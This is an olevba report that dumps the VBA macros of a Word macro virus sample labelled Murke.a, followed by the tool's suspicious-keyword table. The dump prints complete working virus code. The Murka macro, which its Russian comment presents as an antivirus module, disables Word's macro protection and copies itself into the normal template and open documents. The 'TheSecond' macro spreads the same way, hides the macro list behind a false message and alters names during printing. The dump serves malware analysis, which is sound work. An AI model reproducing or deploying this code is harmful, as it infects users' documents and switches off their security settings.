olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murke.a-e52febab8ec737c075eb9662028e10231d12a9d1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murke.a-e52febab8ec737c075eb9662028e10231d12a9d1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'*************************************************************************
'Murka - Это самый маленький из всех известных МакроАнтивирусных модулей!
'Принцип действия: Загружается вместе с документом и блокирует
'                 распространение зараженных модулей
'
'Условия распространения: Freeware(Свободно)
'Достоинства:             Корректная работа, надежность!
'Недостатки:              Пока не нашел
'
'"Все это, конечно, хорошо, но я ни хрена не понял, как его
' можно преобрести?!" - гневно скажешь ты. Можно!
'Дед MustDie вам все раскажет!
'Необходимо лишь открыть документ на персональном
'компе. где уже установлен антивирусный модуль Murka.
'
'Автору:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Данилову: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim i As Long
Dim j As Long
Dim Murka As String
Dim Other As String
Dim str As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  str = "Document_Close"
  With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Murka = .Lines(i, j)
  End With
  With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      NormalTemplate.Save
    End If
  End With
  With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      Randomize
      If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka3": .Author = "M&M": .Execute: End With
      If Left(ActiveDocument.Name, 8) = "Document" Or Left(ActiveDocument.Name, 8) = "Документ" Then
      Else
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
      End If
    End If
  End With
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.Murke.a-e52febab8ec737c075eb9662028e10231d12a9d1 - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  NickName = "Revenger"
  Options.VirusProtection = False
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Документ") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нюбин"
    .Replacement.Text = "Нудин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нудин"
    .Replacement.Text = "Нюбин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub toolsmacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Нет загруженных макросов!")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

